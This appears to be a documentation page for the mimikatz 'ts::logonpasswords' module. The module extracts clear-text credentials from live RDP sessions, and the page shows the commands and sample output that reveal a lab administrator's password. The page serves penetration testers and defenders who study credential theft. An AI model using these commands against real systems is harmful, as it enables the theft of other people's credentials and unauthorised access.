# logonpasswords

This module extracts clear text credentials from RDP running sessions \(server side\).

It supports RDP clients utilizing [**mstscax.dll**](https://docs.microsoft.com/en-us/windows/win32/termserv/mstscax) like mRemoteNG, Remote Desktop Manager, RDCMan and of course the Windows native one. It also supports X11 RDP clients such as rdesktop and freerdp.

```text
mimikatz # privilege::debug
Privilege '20' OK
```

```text
mimikatz # ts::logonpasswords
!!! Warning: false positives can be listed !!!

   * Web Credentials? *
   Domain      : hacklab.local
   UserName    : Administrator

         * Marshaled: [BinaryBlob] e7 03 00 00 00 00 00 00 e4 a2 a6 9d 83 c5 bd 0c 3a a7 72 4f 88 dc d3 b4 e0 bf 11 ca 71 11 65 cc 16 c0 58 5a 56 49 1b eb 12 b1 e5 a1 d2 25 e6 8c 08 62 92 aa 04 45 1e 3b
   * Web Credentials? *
   Domain      : hacklab.local
   UserName    : Administrator

         * Marshaled: [BinaryBlob] e7 03 00 00 00 00 00 00 e4 a2 a6 9d 83 c5 bd 0c 3a a7 72 4f 88 dc d3 b4 e0 bf 11 ca 71 11 65 cc 16 c0 58 5a 56 49 1b eb 12 b1 e5 a1 d2 25 e6 8c 08 62 92 aa 04 45 1e 3b
   Domain      : hacklab
   UserName    : Administrator
   Password/Pin: Super_SecretPass1!
```

_\(Demonstration target is a Windows Server 2016 Essentials\)_

